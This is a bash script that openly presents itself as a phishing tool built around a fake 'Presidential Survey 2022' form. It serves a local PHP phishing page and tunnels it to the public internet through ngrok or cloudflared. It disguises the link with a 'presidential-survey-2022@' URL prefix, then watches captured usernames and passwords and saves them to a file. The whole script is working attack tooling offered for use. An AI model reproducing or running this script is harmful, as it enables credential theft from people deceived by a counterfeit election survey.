#!/bin/bash
GREEN="$(printf '\033[32m')"
banner() {
	cat <<- EOF
	
   ${GREEN}  ██████████   ██████████ ██████████       █████████  ██████████   █████████ 
   ${GREEN}░░███░░░░███ ░░███░░░░░█░░███░░░░███     ███░░░░░███░░███░░░░░█  ███░░░░░███
   ${GREEN} ░███   ░░███ ░███  █ ░  ░███   ░░███   ░███    ░░░  ░███  █ ░  ███     ░░░ 
   ${GREEN} ░███   PRESIDENTIAL SURVEY FORM 2022 - PHISHING TOOL CODED BY 0XBIT         
   ${GREEN} ░███    ░███ ░███░░█    ░███    ░███    ░░░░░░░░███ ░███░░█   ░███   V.1      
   ${GREEN} ░███    ███  ░███ ░   █ ░███    ███     ███    ░███ ░███ ░   █░░███     ███
   ${GREEN}  ██████████   ██████████ ██████████     ░░█████████  ██████████ ░░█████████ 
   ${GREEN}░░░░░░░░░░   ░░░░░░░░░░ ░░░░░░░░░░       ░░░░░░░░░  ░░░░░░░░░░   ░░░░░░░░░  
	EOF
 }
 
banner

PIDKILL() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

HOST='127.0.0.1'
PORT='8080'

PHP_START() {
	echo -e "\n Setting up server..."
	echo -ne "\n Starting PHP server..."
	cd .sites/Survey && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_creds() {
	echo -e ""
	echo -e "\n Waiting for Next Login Info, Ctrl + C to exit. "
	echo -e ""
	echo -e "[*] USERNAME AND PASSWORD [*]"
	rm .sites/Survey/usernames.txt
	touch .sites/Survey/usernames.txt
	
	tail -f .sites/Survey/usernames.txt
}

save_cred() {
	cat .sites/Survey/usernames.txt >> save-creds.txt
}

start_ngrok() {
	echo -e "\n Initializing...( http://$HOST:$PORT )"
	{ sleep 1; PHP_START; }
	echo -ne "\n\n Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 10; clear; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	echo -e ""
	ngrok_url1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[-0-9a-z]*\.ngrok.io")
	echo -e "\n URL 1 : $ngrok_url"
	echo -e "\n URL 2 : $mask@$ngrok_url1"
	capture_creds
}

start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n Initializing... http://$HOST:$PORT )"
	{ sleep 1; PHP_START; }
	echo -ne "\n\n Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 10; clear; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n [-]URL 1 : $cldflr_link"
	echo -e "\n [-]URL 2 : $mask@$cldflr_link1"
	capture_creds
}

start_localhost() {
	echo -e "\n Initializing... ( http://$HOST:$PORT )"
	PHP_START
	{ sleep 1; clear; }
	echo -e "\n Successfully Hosted at : http://$HOST:$PORT "
	capture_creds
}

MENU() {
	{ clear; }
	cat <<- EOF
	[*]////////////////[*]
	    
		[1] Localhost    [-]
		[2] Ngrok.io     [-]
		[3] Cloudflared  [-]

	[*]////////////////[*]
	EOF

	read -p "[-] Select: "

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n Invalid Option, Try Again..."
			{ sleep 1; MENU; };;
	esac
}

survey() {
	cat <<- EOF
	
	   [*]///////////////////////////////////////////////////////////////////////[*]
	
	EOF

	read -p "   [-]type start:  "

	case $REPLY in 
		start | 1)
			website="Survey"
			mask='https://presidential-survey-2022'
			MENU;;
		*)
			echo -ne "\n Invalid Option, Try Again..."
			{ sleep 1; clear; survey; };;
	esac
}
save_cred
survey
PIDKILL
